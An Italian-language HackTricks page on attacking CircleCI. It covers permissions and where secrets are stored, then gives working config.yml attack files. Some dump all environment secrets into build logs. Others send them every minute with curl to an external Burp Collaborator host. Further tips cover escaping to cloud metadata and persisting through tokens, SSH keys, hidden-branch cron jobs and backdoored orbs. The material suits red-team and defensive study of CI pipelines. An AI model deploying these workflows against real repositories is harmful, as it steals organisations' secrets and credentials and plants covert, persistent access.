# Sicurezza di CircleCI

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Informazioni di base

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/) √® una piattaforma di Continuos Integration in cui puoi **definire modelli** indicando cosa vuoi che faccia con del codice e quando farlo. In questo modo puoi **automatizzare i test** o **le distribuzioni** direttamente **dalla branch master del tuo repository**, ad esempio.

## Permessi

**CircleCI** **eredita i permessi** da github e bitbucket relativi all'**account** che effettua l'accesso.\
Nelle mie prove ho verificato che finch√© hai **permessi di scrittura sul repository in github**, sarai in grado di **gestire le impostazioni del progetto in CircleCI** (impostare nuove chiavi ssh, ottenere chiavi api del progetto, creare nuove branch con nuove configurazioni di CircleCI...).

Tuttavia, devi essere un **amministratore del repository** per **convertire il repository in un progetto CircleCI**.

## Variabili di ambiente e segreti

Secondo [**la documentazione**](https://circleci.com/docs/2.0/env-vars/) ci sono diversi modi per **caricare valori nelle variabili di ambiente** all'interno di un flusso di lavoro.

### Variabili di ambiente integrate

Ogni contenitore eseguito da CircleCI avr√† sempre [**variabili di ambiente specifiche definite nella documentazione**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables) come `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME` o `CIRCLE_USERNAME`.

### Testo in chiaro

Puoi dichiararle in chiaro all'interno di un **comando**:
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
Puoi dichiararli in chiaro all'interno dell'**ambiente di esecuzione**:
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
Puoi dichiararli in chiaro all'interno dell'**ambiente build-job**:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
Puoi dichiararli in chiaro all'interno dell'**ambiente di un container**:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
### Secreti del progetto

Questi sono **secreti** che saranno accessibili solo dal **progetto** (da **qualsiasi branch**).\
Puoi vederli dichiarati in _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_

![](<../.gitbook/assets/image (50).png>)

{% hint style="danger" %}
La funzionalit√† "**Importa variabili**" consente di **importare variabili da altri progetti** in questo.
{% endhint %}

### Secreti di contesto

Questi sono segreti che riguardano **tutta l'organizzazione**. Di **default, ogni repository** sar√† in grado di **accedere a qualsiasi segreto** memorizzato qui:

![](<../.gitbook/assets/image (80).png>)

{% hint style="success" %}
Tuttavia, nota che √® possibile **selezionare un gruppo diverso** (anzich√© Tutti i membri) per **concedere l'accesso ai segreti solo a persone specifiche**.\
Attualmente, questa √® una delle migliori modalit√† per **aumentare la sicurezza dei segreti**, per non consentire a tutti di accedervi ma solo a alcune persone.
{% endhint %}

## Attacchi

### Ricerca di segreti in testo normale

Se hai **accesso al VCS** (come github), controlla il file `.circleci/config.yml` di **ogni repository su ogni branch** e **cerca** potenziali **segreti in testo normale** memorizzati l√¨.

### Enumerazione delle variabili di ambiente segrete e dei contesti

Controllando il codice, puoi trovare **tutti i nomi dei segreti** che vengono **utilizzati** in ogni file `.circleci/config.yml`. Puoi anche ottenere i **nomi dei contesti** da quei file o controllarli nella console web: _https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_.

### Esfiltrare i segreti del progetto

{% hint style="warning" %}
Per **esfiltrare TUTTI** i segreti del progetto e del contesto, √® sufficiente avere **accesso in scrittura** a **solo 1 repository** nell'intera organizzazione di github (_e il tuo account deve avere accesso ai contesti, ma di default tutti possono accedere a ogni contesto_).
{% endhint %}

{% hint style="danger" %}
La funzionalit√† "**Importa variabili**" consente di **importare variabili da altri progetti** in questo. Pertanto, un attaccante potrebbe **importare tutte le variabili del progetto da tutti i repository** e quindi **esfiltrarle tutte insieme**.
{% endhint %}

Tutti i segreti del progetto sono sempre impostati nell'env dei job, quindi chiamare env e oscurarlo in base64 esfiltrer√† i segreti nella **console di log web dei workflow**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
Se **non hai accesso alla console web** ma hai **accesso al repository** e sai che viene utilizzato CircleCI, puoi semplicemente **creare un flusso di lavoro** che viene **attivato ogni minuto** e che **esfila le informazioni segrete verso un indirizzo esterno**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
### Estrarre i segreti del contesto

√à necessario **specificare il nome del contesto** (questo permetter√† anche di estrarre i segreti del progetto):
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
Se **non hai accesso alla console web** ma hai **accesso al repository** e sai che viene utilizzato CircleCI, puoi semplicemente **modificare un flusso di lavoro** che viene **attivato ogni minuto** e che **esfila le segrete verso un indirizzo esterno**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
Creare un nuovo `.circleci/config.yml` in un repository **non √® sufficiente per avviare una build di CircleCI**. √à necessario **abilitarlo come progetto nella console di CircleCI**.
{% endhint %}

### Fuga verso il Cloud

**CircleCI** ti offre la possibilit√† di eseguire **le tue build sulle loro macchine o sulle tue**.\
Di default, le loro macchine si trovano in GCP e inizialmente non sarai in grado di trovare nulla di rilevante. Tuttavia, se una vittima sta eseguendo i task **nelle proprie macchine (potenzialmente, in un ambiente cloud)**, potresti trovare un **endpoint di metadati cloud con informazioni interessanti**.

Nota che negli esempi precedenti √® stato lanciato tutto all'interno di un container Docker, ma puoi anche **chiedere di lanciare una macchina virtuale** (che potrebbe avere diverse autorizzazioni cloud):
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
O addirittura un contenitore docker con accesso a un servizio docker remoto:
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
### Persistenza

* √à possibile **creare token utente in CircleCI** per accedere ai punti API con l'accesso degli utenti.
* _https://app.circleci.com/settings/user/tokens_
* √à possibile **creare token di progetto** per accedere al progetto con le autorizzazioni fornite al token.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* √à possibile **aggiungere chiavi SSH** ai progetti.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* √à possibile **creare un lavoro cron in un branch nascosto** in un progetto inaspettato che sta **leakando** tutte le variabili di ambiente del contesto ogni giorno.
* Oppure creare in un branch / modificare un lavoro noto che **leaker√†** tutti i contesti e i segreti del progetto ogni giorno.
* Se sei un proprietario di GitHub puoi **consentire orb non verificati** e configurarne uno in un lavoro come **backdoor**
* Puoi trovare una **vulnerabilit√† di injection di comandi** in qualche attivit√† e **iniettare comandi** tramite un **segreto** modificandone il valore

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguimi** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
